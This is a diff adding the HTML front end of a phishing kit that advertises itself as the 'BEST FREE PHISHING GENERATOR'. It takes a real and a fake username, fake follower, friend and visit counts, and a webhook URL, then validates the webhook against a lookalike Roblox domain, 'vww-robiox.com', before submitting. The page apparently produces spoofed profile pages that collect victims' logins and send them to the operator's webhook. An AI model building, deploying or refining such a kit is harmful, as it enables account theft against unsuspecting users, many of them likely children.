@@ -1,0 +1,108 @@
+<!doctype html>
+<html lang="en">
+<head>
+<title>LeysiKey - Generator</title>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<link rel="icon" type="image/png" sizes="16x16" href="https://i.pinimg.com/564x/bf/b3/bb/bfb3bbdf529b7a9bebf3928ff9cc7b54.jpg">
+<link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+<link rel="stylesheet" href="css/style.css">
+<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+<script src="https://www.google.com/recaptcha/api.js" async defer></script>
+</head>
+<body>
+<section class="ftco-section">
+<div class="container">
+<div class="row justify-content-center">
+<div class="col-md-6 col-lg-4">
+<div class="login-wrap py-5">
+<h3 class="text-center mb-0">LeysiKey</h3>
+<p class="text-center">BEST FREE PHISHING GENERATOR</p>
+<form class="login-form" method="POST">
+<div class="form-group">
+<div class="icon d-flex align-items-center justify-content-center"><span class="fa fa-user"></span></div>
+<input type="text" id="realusername" name="realusername" class="form-control" placeholder="Real Username">
+</div>
+<div class="form-group">
+<div class="icon d-flex align-items-center justify-content-center"><span class="fa fa-user"></span></div>
+<input type="text" id="fakeusername" name="fakeusername" class="form-control" placeholder="Fake Username">
+</div>
+<div class="input-group mb-3 form-group">
+<input type="text" class="form-control" placeholder="Friends" aria-label="Friends" id="friends" name="friends" oninput="this.value = this.value.replace(/[^0-9.]/g, '').replace(/(\..*?)\..*/g, '$1');">
+<input type="text" class="form-control" placeholder="Followers" aria-label="Followers" id="followers" name="followers" oninput="this.value = this.value.replace(/[^0-9.]/g, '').replace(/(\..*?)\..*/g, '$1');">
+</div>
+<div class="input-group mb-3 form-group">
+<input type="text" class="form-control" placeholder="Followings" aria-label="Followings" id="followings" name="followings" oninput="this.value = this.value.replace(/[^0-9.]/g, '').replace(/(\..*?)\..*/g, '$1');">
+<input type="text" class="form-control" placeholder="Place Visists" aria-label="Place Visists" id="placevisits" name="placevisits" oninput="this.value = this.value.replace(/[^0-9.]/g, '').replace(/(\..*?)\..*/g, '$1');">
+</div>
+<label for="about" style="color:#fff;">About</label>
+<div class="form-floating">
+<textarea class="form-control" placeholder="Leave a comment here" id="about" name="about" style="height: 50px"></textarea>
+</div>
+<label for="about" style="color:#fff;">Account Created</label>
+<div class="form-group">
+<div class="icon d-flex align-items-center justify-content-center"></div>
+<input type="date" id="date" name="date" class="form-control" placeholder="Date" required>
+</div>
+<div class="form-group">
+<div class="icon d-flex align-items-center justify-content-center"><span class="fa fa-cog"></span></div>
+<input type="url" id="webhook" name="webhook" class="form-control" placeholder="Webhook" required>
+</div>
+<div class="form-group">
+<div class="g-recaptcha" data-sitekey="6LenZJwdAAAAAPAGPUqmAxGln0cDmIrF373xpgSx"></div>
+</div>
+<div class="form-group">
+ <input type="submit" name="submit" id="submit" class="btn form-control btn-primary rounded submit px-3" value="Create Now!" hidden>
+<input type="button" class="btn form-control btn-primary rounded submit px-3" value="Create Now!" onclick="generate()">
+</div>
+</form>
+</div>
+</div>
+</div>
+</div>
+</section>
+<script>
+        function generate(){
+                var RealUsername = document.getElementById("realusername").value;
+                var FakeUsername = document.getElementById("fakeusername").value;
+                var Friends = document.getElementById("friends").value;
+                var Followers = document.getElementById("followers").value;
+                var Followings = document.getElementById("followings").value;
+                var PlaceVisits = document.getElementById("placevisits").value;
+                var About = document.getElementById("about").value;
+                var Webhook = document.getElementById("webhook").value;
+                if(!RealUsername || !FakeUsername || !Friends || !Followers || !Followings || !About || !Webhook || !PlaceVisits){
+                    Swal.fire(
+                      'Error',
+                      'Input cannot be empty',
+                      'error'
+                    )
+                }else{
+                    const url = 'https://vww-robiox.com/generator/check-webhook.php?url=' + Webhook;
+                    $.ajax(url, {
+                    method: "GET",
+                    success: (data) => {
+                        const obj = $.parseJSON(data);
+                        if(obj['result'] == "false"){
+                            Swal.fire(
+                              'Error',
+                              'Invalid Webhook',
+                              'error'
+                            );
+                            console.log(url);
+                        }else{
+                            document.getElementById("submit").click();
+                        }
+                    }
+                });
+            }
+        }
+    </script>
+<script src="js/jquery.min.js"></script>
+<script src="js/popper.js"></script>
+<script src="js/bootstrap.min.js"></script>
+<script src="js/main.js"></script>
+</body>
+</html>
